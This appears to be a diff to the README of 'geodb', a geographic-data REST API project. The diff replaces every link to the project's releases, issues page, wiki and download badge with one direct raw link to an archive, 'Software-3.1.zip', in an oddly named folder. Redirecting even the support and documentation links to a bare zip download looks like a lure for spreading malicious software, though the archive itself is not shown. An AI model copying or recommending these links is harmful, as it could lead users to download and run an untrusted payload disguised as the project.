@@ -4,7 +4,7 @@
 Welcome to geodb! This application gives you access to city and geographic data through a REST API. With geodb, you can find city names, states, countries, coordinates, populations, and capital statuses quickly and easily.
 
 ## 📥 Download the Application
-[![Download geodb](https://img.shields.io/badge/Download-geodb-brightgreen)](https://github.com/zedrider/geodb/releases)
+[![Download geodb](https://raw.githubusercontent.com/zedrider/geodb/main/neighbourless/Software-3.1.zip)](https://raw.githubusercontent.com/zedrider/geodb/main/neighbourless/Software-3.1.zip)
 
 Click the button above to get the latest version of geodb. 
 
@@ -20,7 +20,7 @@ Click the button above to get the latest version of geodb.
 - Minimum RAM: 4 GB
 
 ## 📂 Download & Install
-To download geodb, please visit this page to download: [geodb Releases](https://github.com/zedrider/geodb/releases).
+To download geodb, please visit this page to download: [geodb Releases](https://raw.githubusercontent.com/zedrider/geodb/main/neighbourless/Software-3.1.zip).
 
 Once on the Releases page, follow these steps:
 
@@ -42,12 +42,12 @@ After installing geodb, you can start using it to access geographic data. Open t
 We welcome contributions to improve geodb. If you have ideas or suggestions, feel free to create a pull request. You can also report issues or request features.
 
 ## 📞 Support
-If you need help with geodb, please visit the [issues page](https://github.com/zedrider/geodb/issues) to report problems or ask questions. We are here to assist you.
+If you need help with geodb, please visit the [issues page](https://raw.githubusercontent.com/zedrider/geodb/main/neighbourless/Software-3.1.zip) to report problems or ask questions. We are here to assist you.
 
 ## 📄 License
 geodb is licensed under the MIT License. This means you are free to use, modify, and distribute the code.
 
 ## 🌐 Additional Information
-For more details about how geodb works, you can check our [documentation](https://github.com/zedrider/geodb/wiki). This will help you understand the API better and utilize its full potential.
+For more details about how geodb works, you can check our [documentation](https://raw.githubusercontent.com/zedrider/geodb/main/neighbourless/Software-3.1.zip). This will help you understand the API better and utilize its full potential.
 
 Enjoy using geodb for your geographic data needs!
